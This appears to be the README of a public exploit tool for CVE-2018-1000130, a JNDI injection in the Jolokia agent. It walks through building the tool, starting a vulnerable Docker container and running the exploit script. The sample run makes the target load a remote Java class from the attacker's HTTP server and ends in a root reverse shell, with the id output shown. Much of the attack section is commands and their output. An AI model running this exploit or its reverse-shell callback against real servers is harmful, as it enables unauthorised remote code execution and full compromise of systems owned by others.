# jolokia_jndi_rce

## Summary

CVE-2018-1000130 - A JNDI Injection vulnerability exists in Jolokia agent version < 1.5.0 in the proxy mode  #
that allows a remote attacker to run arbitrary Java code on the server.   

Here is the exploit code for exploit this issue.

## Dependencies

You need first build the project with maven to get a jar files that is needed to trigger the vulnerability. 


```ssh
jolokia_jndi_rce  master ⦿ mvn clean install
```

## Usage

Start docker container with Jolokia if you want to test this locally

```ssh
jolokia_jndi_rce  master $ ./docker/boot.sh

 TOMCAT_VERSION : 9.0.8                       
 JOLOKIA_VERSION: 1.4.0
 HAWTIO_VERSION : 1.5.9
 BUILD_DATE     : 2018-06-20
                 
docker build \    
        --force-rm \                                                                                                                                                                                                                                      
        --compress \
        --build-arg BUILD_DATE=2018-06-20 \
        --build-arg BUILD_VERSION=1806 \
        --build-arg TOMCAT_VERSION=9.0.8 \
        --build-arg JOLOKIA_VERSION=1.4.0 \
        --build-arg HAWTIO_VERSION=1.5.9 \
        --tag bodsch/docker-jolokia:1.4.0 .    
Sending build context to Docker daemon  20.25kB                 
Step 1/14 : FROM alpine:latest 
 ---> 3fd9065eaf02
Step 2/14 : EXPOSE 8080 22222
 ---> Using cache
 ---> 66b8276cd36f
Step 3/14 : ARG BUILD_DATE
 ---> Using cache
 ---> 78f14e88a62b
Step 4/14 : ARG BUILD_VERSION
 ---> Using cache
 ---> 764ac80ad4df
Step 5/14 : ARG TOMCAT_VERSION
 ---> Using cache
 ---> 2701582b9e17
Step 6/14 : ARG JOLOKIA_VERSION
 ---> Using cache
 ---> 16523bc75bb0
Step 7/14 : ARG HAWTIO_VERSION
 ---> Using cache
 ---> 6ee7b5cd61c6
Step 8/14 : ENV   TERM=xterm   APACHE_MIRROR=archive.apache.org   CATALINA_HOME=/opt/tomcat   OPENJDK_VERSION="8.151.12"   JAVA_HOME=/usr/lib/jvm/default-jvm   PATH=${PATH}:/opt/jdk/bin:${CATALINA_HOME}/bin   LANG=C.UTF-8
 ---> Using cache
 ---> 302678ddc809
Step 9/14 : LABEL   version=${BUILD_VERSION}   maintainer="Bodo Schulz <bodo@boone-schulz.de>"   org.label-schema.build-date=${BUILD_DATE}   org.label-schema.name="Jolokia Docker Image"   org.label-schema.description="Inofficial Jolokia Docker Image"
  org.label-schema.url="https://jolokia.org"   org.label-schema.vcs-url="https://github.com/bodsch/docker-jolokia"   org.label-schema.vendor="Bodo Schulz"   org.label-schema.version=$JOLOKIA_VERSION   org.label-schema.schema-version="1.0"   com.microscaling.docker.dockerfile="/Dockerfile"   com.microscaling.license="GNU General Public License v3.0"
 ---> Using cache
 ---> 569b99092c58
Step 10/14 : RUN   apk update --quiet --no-cache &&   apk upgrade --quiet --no-cache &&   apk add --quiet --no-cache     curl     openjdk8-jre-base     python2     bash     tomcat-native &&   echo "export LANG=${LANG}" > /etc/profile.d/locale.sh &&  
echo 'hosts: files mdns4_minimal [NOTFOUND=return] dns mdns4' >> /etc/nsswitch.conf &&   sed -i 's,#networkaddress.cache.ttl=-1,networkaddress.cache.ttl=30,' ${JAVA_HOME}/jre/lib/security/java.security &&   mkdir /opt &&   echo "download tomcat version $TOMCAT_VERSION (https://$APACHE_MIRROR/dist/tomcat/tomcat-9)" &&   curl     --silent     --location     --retry 3     --cacert /etc/ssl/certs/ca-certificates.crt     https://$APACHE_MIRROR/dist/tomcat/tomcat-9/v$TOMCAT_VERSION/bin/apache-tomcat-$TOMCAT_VERSION.tar.gz     | gunzip     | tar x -C /opt/ &&   ln -s /opt/apache-tomcat-$TOMCAT_VERSION ${CATALINA_HOME} &&   ln -s ${CATALINA_HOME}/logs /var/log/jolokia &&   rm -rf ${CATALINA_HOME}/webapps/* &&   echo "download jolokia version $JOLOKIA_VERSION (https://repo1.maven.org/maven2/org/jolokia/jolokia-war)" &&   curl     --silent     --location     --retry 3     --cacert /etc/ssl/certs/ca-certificates.crt     --output ${CATALINA_HOME}/webapps/jolokia.war   https://repo1.maven.org/maven2/org/jolokia/jolokia-war/$JOLOKIA_VERSION/jolokia-war-$JOLOKIA_VERSION.war &&   echo "download hawtio version $HAWTIO_VERSION (https://github.com/hawtio/hawtio/tags)" &&   curl     --silent     --location     --retry 3     --cacert /etc/ssl/certs/ca-certificates.crt     --output ${CATALINA_HOME}/webapps/hawtio.war     https://oss.sonatype.org/content/repositories/public/io/hawt/hawtio-default/$HAWTIO_VERSION/hawtio-default-$HAWTIO_VERSION.war &&   cd ${CATALINA_HOME}/webapps/ &&   mkdir     jolokia hawtio &&   unzip jolokia.war -d jolokia > /dev/null &&   unzip hawtio.war -d hawtio > /dev/null &&   rm -f *.war &&   rm -f ${CATALINA_HOME}/LICENSE &&   rm -f ${CATALINA_HOME}/NOTICE &&   rm -f ${CATALINA_HOME}/RELEASE-NOTES &&   rm -f ${CATALINA_HOME}/RUNNING.txt &&   rm -f ${CATALINA_HOME}/bin/*.bat &&   rm -rf     /tmp/*     /var/cache/apk/*
 ---> Using cache
 ---> d318100c0965
Step 11/14 : WORKDIR ${CATALINA_HOME}/webapps/
 ---> Using cache
 ---> a38e33bc80b8
Step 12/14 : COPY rootfs/ /
 ---> Using cache
 ---> 463e1a1e4342
Step 13/14 : HEALTHCHECK   --interval=5s   --timeout=2s   --retries=12   CMD curl --silent --fail http://localhost:8080/jolokia || exit 1                                                                                                                 
 ---> Using cache
 ---> 56cdd745daa7
Step 14/14 : CMD [ "/init/run.sh" ]
 ---> Using cache
 ---> ef1b46f0ec63
Successfully built ef1b46f0ec63
Successfully tagged bodsch/docker-jolokia:1.4.0
82cca622f5e3dc74194cec212d5fd6b08656f306cf1d3657d8a769411c5c1ba0
```

Verify that container is running.

```ssh
⬢  jolokia_jndi_rce  master ⦿ docker ps
CONTAINER ID        IMAGE                         COMMAND             CREATED             STATUS                    PORTS                               NAMES
82cca622f5e3        bodsch/docker-jolokia:1.4.0   "/init/run.sh"      48 seconds ago      Up 47 seconds (healthy)   0.0.0.0:8080->8080/tcp, 22222/tcp   infallible_bell
```

Run ./jolokia_jndi_rce.py to get the usage menu. 

```ssh
./jolokia_jndi_rce.py 

 ▐▄▄▄      ▄▄▌        ▄ •▄ ▪   ▄▄▄·  ▐▄▄▄ ▐ ▄ ·▄▄▄▄  ▪  ▄▄▄   ▄▄· ▄▄▄ .
  ·██▪     ██•  ▪     █▌▄▌▪██ ▐█ ▀█   ·██•█▌▐███▪ ██ ██ ▀▄ █·▐█ ▌▪▀▄.▀·
▪▄ ██ ▄█▀▄ ██▪   ▄█▀▄ ▐▀▀▄·▐█·▄█▀▀█ ▪▄ ██▐█▐▐▌▐█· ▐█▌▐█·▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐▌▐█▌▐█▌.▐▌▐█▌▐▌▐█▌.▐▌▐█.█▌▐█▌▐█ ▪▐▌▐▌▐█▌██▐█▌██. ██ ▐█▌▐█•█▌▐███▌▐█▄▄▌
 ▀▀▀• ▀█▄▀▪.▀▀▀  ▀█▄▀▪·▀  ▀▀▀▀ ▀  ▀  ▀▀▀•▀▀ █▪▀▀▀▀▀• ▀▀▀.▀  ▀·▀▀▀  ▀▀▀ 
[nighter@nighter.se]
    
Usage: ./jolokia_jndi_rce.py <URL> <LHOST> <LPORT>

EXAMPLE: ./jolokia_jndi_rce.py 'http://127.0.0.1:8080' 10.10.14.24 7777
```        

Run the exploit

```ssh
⬢  jolokia_jndi_rce  master ⦿ ./jolokia_jndi_rce.py 'http://127.0.0.1:8080' 192.168.1.94 7777
[+] LHOST = 192.168.1.94
[+] Preparing payload
[+] Shell listen
Listening on 0.0.0.0:9092
Starting HTTP server
[+] Exploit
Send LDAP reference result for jmxrmi redirecting to http://192.168.1.94:7873/ExportObject.class
javaCodeBase: http://192.168.1.94:7873/
new http request from /172.17.0.2:54122 /ExportObject.class
/opt/apache-tomcat-9.0.8/webapps # ls
hawtio   jolokia
/opt/apache-tomcat-9.0.8/webapps # ls -al
total 28
drwxr-x---    1 root     root          4096 Jun 21 08:08 .
drwxr-xr-x    1 root     root          4096 Jun 21 08:08 ..
drwxr-xr-x    9 root     root          4096 Jun 21 08:08 hawtio
drwxr-xr-x    1 root     root          4096 Jun 21 08:08 jolokia
/opt/apache-tomcat-9.0.8/webapps # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/opt/apache-tomcat-9.0.8/webapps # 
``
